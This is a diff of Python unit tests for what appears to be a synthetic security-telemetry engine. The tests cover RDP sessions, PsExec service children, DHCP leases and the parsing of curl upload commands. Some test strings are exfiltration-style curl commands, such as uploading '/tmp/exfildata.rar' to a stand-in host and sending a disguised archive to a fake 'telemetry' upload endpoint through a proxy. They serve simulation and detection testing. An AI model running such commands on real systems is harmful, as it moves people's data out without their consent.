+            logon_type=10,
+            source_ip="10.10.1.99",
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=target,
+            time=session_time,
+            activity="establish RDP session",
+            explicit_types={"logon"},
+        )
+        process_time = engine._apply_storyline_shell_availability(
+            actor=actor,
+            system=target,
+            time=session_time + timedelta(milliseconds=20),
+            rng=random.Random(1),
+        )
+
+        assert process_time > ready_time
+
     def test_recent_psexesvc_service_runs_follow_on_commands_as_system(self):
         source = System(
             hostname="DC-01",
@@ -3213,6 +4428,8 @@ class TestStorylineCommandSideEffects:
         assert child_proc["user"].username == "SYSTEM"
         assert child_proc["logon_id"] == "0x3e7"
         assert child_proc["parent_pid"] == 4242
+        assert service_proc["lifecycle_group_id"]
+        assert child_proc["lifecycle_group_id"] == service_proc["lifecycle_group_id"]
 
     def test_old_psexesvc_service_does_not_parent_later_commands(self):
         source = System(
@@ -3292,6 +4509,19 @@ class TestStorylineCommandSideEffects:
         )
         engine = object.__new__(StorylineMixin)
         engine.scenario = SimpleNamespace(environment=SimpleNamespace(systems=[source]))
+        dhcp_server = System(
+            hostname="DHCP-01",
+            ip="10.10.2.10",
+            os="Windows Server 2022",
+            type="server",
+            roles=["dhcp_server"],
+            services=["windows-dhcp-server"],
+        )
+        engine.world_model = SimpleNamespace(
+            systems_with_capability=lambda _capability, distinct_from: (
+                [dhcp_server] if distinct_from is source else []
+            )
+        )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
         engine.dispatcher = SimpleNamespace(visibility_engine=None)
@@ -3300,11 +4530,12 @@ class TestStorylineCommandSideEffects:
             "ROGUE-LAPTOP": {
                 "mac": "f0:1f:af:b7:35:b2",
                 "lease_time": 7200.0,
+                "renewal_interval": 3511.25,
                 "last_renewal": 1710763200.0,
                 "system": source,
             }
         }
-        spec = SimpleNamespace(type="dhcp_lease", requested_ip=None, mac_address=None)
+        spec = DhcpLeaseEventSpec(ids_alerts=[{"sid": 2002911, "policy": "every"}])
 
         engine._execute_typed_event(
             spec=spec,
@@ -3320,7 +4551,175 @@ class TestStorylineCommandSideEffects:
         assert lease["lease_time"] == 7200.0
         assert lease["msg_types"] == ["REQUEST", "ACK"]
         assert lease["renewal_interval"] > 0
+        assert lease["renewal_interval"] == 3511.25
+        assert [context.sid for context in lease["ids_alerts"]] == [2002911]
+        assert "ids_alerts" not in engine._dhcp_lease_state["ROGUE-LAPTOP"]
         assert (
             engine._dhcp_lease_state["ROGUE-LAPTOP"]["next_renewal"]
             == lease["time"].timestamp() + lease["renewal_interval"]
         )
+
+    def test_raw_curl_rar_upload_keeps_local_name_off_wire(self):
+        """Raw --data-binary resolves the local RAR without inventing an HTTP filename."""
+
+        entity = StorylineMixin._http_request_entity_from_command(
+            "curl --data-binary @/tmp/exfildata.rar http://some.site/uploads/accept-upload",
+            42 * 1024 * 1024,
+        )
+
+        assert entity is not None
+        assert entity.size == 44_040_192
+        assert entity.mime_type == "application/vnd.rar"
+        assert entity.local_source_path == "/tmp/exfildata.rar"
+        assert entity.local_source_filename == "exfildata.rar"
+        assert entity.wire_filename == ""
+
+    def test_multipart_curl_upload_exposes_wire_filename(self):
+        """Multipart form-data carries the basename in Content-Disposition."""
+
+        entity = StorylineMixin._http_request_multipart_from_command(
+            "curl -F file=@/tmp/report.zip http://some.site/upload",
+            8192,
+        )
+
+        assert entity is not None
+        part = entity.leaf_parts()[0]
+        assert part.local_source_filename == "report.zip"
+        assert part.wire_filename == "report.zip"
+
+    def test_authored_multipart_upload_requires_exact_curl_command_owner(self):
+        """A neighboring curl probe cannot own an authored multipart upload."""
+
+        spec = ConnectionEventSpec.model_validate(
+            {
+                "dst_ip": "45.33.32.30",
+                "dst_port": 443,
+                "hostname": "api.westbridge-services.net",
+                "method": "POST",
+                "uri": "/upload/telemetry/7f3a2b19",
+                "request_multipart": {
+                    "media_type": "multipart/form-data",
+                    "parts": [
+                        {
+                            "name": "archive",
+                            "body_len": 18_782_613,
+                            "local_source_path": r"C:\ProgramData\Microsoft\cache_7f3a.zip",
+                            "filename": "cache_7f3a.zip",
+                        }
+                    ],
+                },
+            }
+        )
+        upload = SimpleNamespace(
+            command_line=(
+                r"C:\Windows\System32\curl.exe --proxy http://10.10.3.20:8080 "
+                r'-F "archive=@C:\ProgramData\Microsoft\cache_7f3a.zip" '
+                "https://api.westbridge-services.net/upload/telemetry/7f3a2b19"
+            )
+        )
+        probe = SimpleNamespace(
+            command_line=(
+                "curl.exe --proxy http://PROXY-01.meridianhcs.local:8080 "
+                '"https://api.westbridge-services.net/"'
+            )
+        )
+
+        assert _process_owns_storyline_multipart_upload(
+            upload,
+            r"C:\Windows\System32\curl.exe",
+            spec,
+        )
+        assert not _process_owns_storyline_multipart_upload(
+            probe,
+            r"C:\Windows\System32\curl.exe",
+            spec,
+        )
+
+    def test_literal_or_stdin_curl_body_does_not_invent_local_file(self):
+        """Inline data and stdin are request entities but are not endpoint file reads."""
+
+        assert (
+            StorylineMixin._http_request_entity_from_command(
+                'curl --data-binary \'{"status":"ok"}\' http://some.site/api/checkin',
+                15,
+            )
+            is None
+        )
+        assert (
+            StorylineMixin._http_request_entity_from_command(
+                "curl --upload-file - http://some.site/upload",
+                8192,
+            )
+            is None
+        )
+
+    def test_curl_upload_file_equals_form_resolves_local_path(self):
+        """The long curl upload option supports its equals-sign spelling."""
+
+        entity = StorylineMixin._http_request_entity_from_command(
+            "curl --upload-file=/tmp/report.rar http://some.site/upload",
+            8192,
+        )
+
+        assert entity is not None
+        assert entity.local_source_path == "/tmp/report.rar"
+        assert entity.wire_filename == ""
+
+
+def test_process_output_and_network_companions_precede_lifecycle_bookkeeping() -> None:
+    source = System(hostname="SRC", ip="10.10.0.10", os="Windows 11", type="workstation")
+    actor = User(username="alice", full_name="Alice", email="alice@example.com")
+    engine = object.__new__(StorylineMixin)
+    engine.scenario = SimpleNamespace(
+        environment=SimpleNamespace(systems=[source], service_accounts=[])
+    )
+    engine.state_manager = _FakeStateManager()
+    engine.activity_generator = _FakeActivityGenerator()
+    order: list[str] = []
+    files: list[Any] = []
+    generate_process = engine.activity_generator.generate_process
+    generate_connection = engine.activity_generator.generate_connection
+
+    def create(*args: Any, **kwargs: Any) -> int:
+        order.append("root")
+        return generate_process(*args, **kwargs)
+
+    def emit_file(event: Any) -> None:
+        order.append("file")
+        files.append(event)
+
+    def connect(*args: Any, **kwargs: Any) -> str:
+        order.append("network")
+        return generate_connection(*args, **kwargs)
+
+    def mark_story_process(hostname: str, pid: int) -> None:
+        order.append("lifecycle")
+        assert (hostname, pid) == ("SRC", 4242)
+
+    def expand(*args: Any, **kwargs: Any) -> None:
+        raise AssertionError("supplementary=none must suppress expansion")
+
+    engine.activity_generator.generate_process = create
+    engine.activity_generator.generate_connection = connect
+    engine.activity_generator._expand_and_emit = expand
+    engine.state_manager.mark_story_process = mark_story_process
+    engine.dispatcher = SimpleNamespace(visibility_engine=None, dispatch_builder=emit_file)
+    event = engine._execute_typed_event(
+        spec=SimpleNamespace(
+            type="process",
+            process_name="curl.exe",
+            command_line=r"curl.exe https://example.com/status > C:\Temp\status.txt",
+            supplementary="none",
+        ),
+        actor=actor,
+        system=source,
+        time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+        activity="fetch status",
+        explicit_types={"process"},
+    )
+
+    assert order == ["root", "file", "network", "lifecycle"]
+    assert files[0].process.pid == engine.activity_generator.connections[0]["pid"] == 4242
+    assert files[0].process.image == engine.activity_generator.connections[0]["process_image"]
+    assert event["output_file"] == r"C:\Temp\status.txt"
+    assert event["network_url"] == "https://example.com/status"
